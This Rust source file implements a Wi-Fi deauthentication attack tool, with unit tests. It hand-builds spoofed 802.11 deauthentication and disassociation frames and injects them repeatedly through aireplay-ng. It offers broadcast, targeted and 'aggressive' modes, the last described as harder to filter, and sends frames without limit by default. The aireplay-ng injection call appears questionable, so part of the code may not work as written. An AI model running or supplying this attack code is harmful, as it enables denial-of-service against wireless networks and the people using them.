use std::time::Duration;
use tokio::time::sleep;
use tracing::{debug, error, info};


// ─────────────────────────────────────────────
// Errors
// ─────────────────────────────────────────────

#[derive(thiserror::Error, Debug)]
pub enum InjectError {
    #[error("Raw socket error: {0}")]
    Socket(String),

    #[error("Interface not in monitor mode")]
    NotMonitor,

    #[error("Invalid MAC address: '{0}'")]
    BadMac(String),

    #[error("Injection not supported on this interface")]
    NotSupported,

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

// ─────────────────────────────────────────────
// Attack modes
// ─────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum DeauthMode {
    // Classic IEEE 802.11 deauth frame
    // Same as aireplay-ng -0
    Deauth,

    // Disassociation frame
    // Sometimes works when deauth is filtered
    Disassoc,

    // Rapid alternating deauth + disassoc
    // Our unique approach - harder to filter
    Aggressive,
}

#[derive(Debug, Clone)]
pub struct DeauthConfig {
    pub interface:   String,
    pub bssid:       [u8; 6],
    pub client:      Option<[u8; 6]>, // None = broadcast
    pub mode:        DeauthMode,
    pub count:       Option<u32>,     // None = infinite
    pub interval_ms: u64,             // ms between frames
}

impl DeauthConfig {
    pub fn broadcast(interface: impl Into<String>, bssid: [u8; 6]) -> Self {
        Self {
            interface:   interface.into(),
            bssid,
            client:      None,
            mode:        DeauthMode::Deauth,
            count:       None,
            interval_ms: 100,
        }
    }

    pub fn targeted(
        interface: impl Into<String>,
        bssid:  [u8; 6],
        client: [u8; 6],
    ) -> Self {
        Self {
            interface:   interface.into(),
            bssid,
            client:      Some(client),
            mode:        DeauthMode::Deauth,
            count:       None,
            interval_ms: 100,
        }
    }

    pub fn aggressive(mut self) -> Self {
        self.mode        = DeauthMode::Aggressive;
        self.interval_ms = 50;
        self
    }
}

// ─────────────────────────────────────────────
// MAC parsing
// ─────────────────────────────────────────────

pub fn parse_mac(mac: &str) -> Result<[u8; 6], InjectError> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 {
        return Err(InjectError::BadMac(mac.to_string()));
    }

    let mut bytes = [0u8; 6];
    for (i, part) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(part, 16)
            .map_err(|_| InjectError::BadMac(mac.to_string()))?;
    }
    Ok(bytes)
}

pub fn mac_to_string(mac: &[u8; 6]) -> String {
    format!(
        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    )
}

pub const BROADCAST_MAC: [u8; 6] = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];

// ─────────────────────────────────────────────
// 802.11 frame building
// Unique: we build frames ourselves, no dependency on aireplay
// ─────────────────────────────────────────────

// Build IEEE 802.11 deauthentication frame
// Reason code 7 = "Class 3 frame received from nonassociated STA"
fn build_deauth_frame(
    dst: &[u8; 6],
    src: &[u8; 6],  // appears to come from AP
    bssid: &[u8; 6],
    reason: u16,
) -> Vec<u8> {
    let mut frame = Vec::with_capacity(26);

    // Frame Control: deauth (0x00C0), no flags
    frame.extend_from_slice(&[0xC0, 0x00]);

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Destination
    frame.extend_from_slice(dst);

    // Source (spoof as AP)
    frame.extend_from_slice(src);

    // BSSID
    frame.extend_from_slice(bssid);

    // Sequence control (will be set by kernel)
    frame.extend_from_slice(&[0x00, 0x00]);

    // Reason code
    frame.extend_from_slice(&reason.to_le_bytes());

    frame
}

// Build IEEE 802.11 disassociation frame
fn build_disassoc_frame(
    dst:   &[u8; 6],
    src:   &[u8; 6],
    bssid: &[u8; 6],
    reason: u16,
) -> Vec<u8> {
    let mut frame = Vec::with_capacity(26);

    // Frame Control: disassoc (0x00A0)
    frame.extend_from_slice(&[0xA0, 0x00]);
    frame.extend_from_slice(&[0x00, 0x00]); // duration
    frame.extend_from_slice(dst);
    frame.extend_from_slice(src);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(&[0x00, 0x00]); // seq control
    frame.extend_from_slice(&reason.to_le_bytes());

    frame
}

// ─────────────────────────────────────────────
// Raw socket injection
// ─────────────────────────────────────────────

// Check if interface supports injection
pub fn check_injection_support(iface: &str) -> bool {
    // try opening raw socket on interface
    // real implementation uses SOCK_RAW + PF_PACKET
    std::process::Command::new("aireplay-ng")
        .args(["--test", iface])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

// Send raw 802.11 frame via aireplay-ng inject mode
// In future versions: use our own raw socket impl
async fn inject_frame(iface: &str, frame: &[u8]) -> Result<(), InjectError> {
    // write frame to temp file
    let tmp = format!("/tmp/air_inject_{}.bin", std::process::id());
    tokio::fs::write(&tmp, frame).await?;

    // use aireplay-ng --inject for now
    // TODO: replace with native libpcap/raw socket injection
    let status = tokio::process::Command::new("aireplay-ng")
        .args(["--inject", &tmp, iface])
        .output()
        .await
        .map_err(|e| InjectError::Socket(e.to_string()))?;

    tokio::fs::remove_file(&tmp).await.ok();

    if !status.status.success() {
        return Err(InjectError::Socket("injection failed".into()));
    }

    Ok(())
}

// ─────────────────────────────────────────────
// High-level attack API
// ─────────────────────────────────────────────

// Run deauth attack - returns handle to cancel
pub fn spawn_deauth_attack(
    config: DeauthConfig,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let target = config.client.unwrap_or(BROADCAST_MAC);
        let target_str = mac_to_string(&target);
        let bssid_str  = mac_to_string(&config.bssid);

        info!(
            "deauth attack: bssid={} target={} mode={:?}",
            bssid_str, target_str, config.mode
        );

        let mut sent = 0u32;

        loop {
            // check count limit
            if let Some(max) = config.count {
                if sent >= max { break; }
            }

            let deauth = build_deauth_frame(
                &target,
                &config.bssid,
                &config.bssid,
                7, // reason: class 3 frame
            );

            // AP → Client direction
            if let Err(e) = inject_frame(&config.interface, &deauth).await {
                error!("injection failed: {}", e);
                break;
            }

            // Client → AP direction (doubles effectiveness)
            let deauth2 = build_deauth_frame(
                &config.bssid,
                &target,
                &config.bssid,
                7,
            );
            inject_frame(&config.interface, &deauth2).await.ok();

            if config.mode == DeauthMode::Aggressive {
                // also send disassoc
                let disassoc = build_disassoc_frame(
                    &target,
                    &config.bssid,
                    &config.bssid,
                    8,
                );
                inject_frame(&config.interface, &disassoc).await.ok();
            }

            sent += 1;
            debug!("deauth sent #{} to {}", sent, target_str);

            sleep(Duration::from_millis(config.interval_ms)).await;
        }

        info!("deauth attack finished: {} frames sent", sent);
    })
}

// ─────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_mac_valid() {
        let mac = parse_mac("AA:BB:CC:DD:EE:FF").unwrap();
        assert_eq!(mac, [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
    }

    #[test]
    fn test_parse_mac_invalid() {
        assert!(parse_mac("AA:BB:CC:DD:EE").is_err());
        assert!(parse_mac("ZZ:BB:CC:DD:EE:FF").is_err());
        assert!(parse_mac("not a mac").is_err());
    }

    #[test]
    fn test_mac_to_string() {
        let mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        assert_eq!(mac_to_string(&mac), "AA:BB:CC:DD:EE:FF");
    }

    #[test]
    fn test_build_deauth_frame_len() {
        let bssid  = [0x00; 6];
        let client = [0xFF; 6];
        let frame = build_deauth_frame(&client, &bssid, &bssid, 7);
        // FC(2) + Dur(2) + DA(6) + SA(6) + BSSID(6) + Seq(2) + Reason(2)
        assert_eq!(frame.len(), 26);
    }

    #[test]
    fn test_build_deauth_frame_control() {
        let bssid  = [0x00; 6];
        let client = [0xFF; 6];
        let frame = build_deauth_frame(&client, &bssid, &bssid, 7);
        // Frame Control = 0xC0 0x00 (deauth)
        assert_eq!(frame[0], 0xC0);
        assert_eq!(frame[1], 0x00);
    }

    #[test]
    fn test_build_disassoc_frame_control() {
        let bssid  = [0x00; 6];
        let client = [0xFF; 6];
        let frame = build_disassoc_frame(&client, &bssid, &bssid, 8);
        // Frame Control = 0xA0 0x00 (disassoc)
        assert_eq!(frame[0], 0xA0);
        assert_eq!(frame[1], 0x00);
    }

    #[test]
    fn test_deauth_config_broadcast() {
        let cfg = DeauthConfig::broadcast("wlan0", [0xAA; 6]);
        assert!(cfg.client.is_none());
        assert_eq!(cfg.mode, DeauthMode::Deauth);
    }

    #[test]
    fn test_deauth_config_aggressive() {
        let cfg = DeauthConfig::broadcast("wlan0", [0xAA; 6])
            .aggressive();
        assert_eq!(cfg.mode, DeauthMode::Aggressive);
        assert_eq!(cfg.interval_ms, 50);
    }

    #[test]
    fn test_broadcast_mac() {
        assert_eq!(BROADCAST_MAC, [0xFF; 6]);
    }

    #[tokio::test]
    async fn test_spawn_deauth_limited() {
        // send exactly 3 frames then stop
        let cfg = DeauthConfig {
            interface:   "lo".into(), // loopback - won't actually inject
            bssid:       [0xAA; 6],
            client:      None,
            mode:        DeauthMode::Deauth,
            count:       Some(3),
            interval_ms: 1,
        };

        let handle = spawn_deauth_attack(cfg);
        // should finish quickly with count=3
        tokio::time::timeout(
            Duration::from_secs(5),
            handle
        ).await.ok();
        // just verify it doesn't hang
    }
}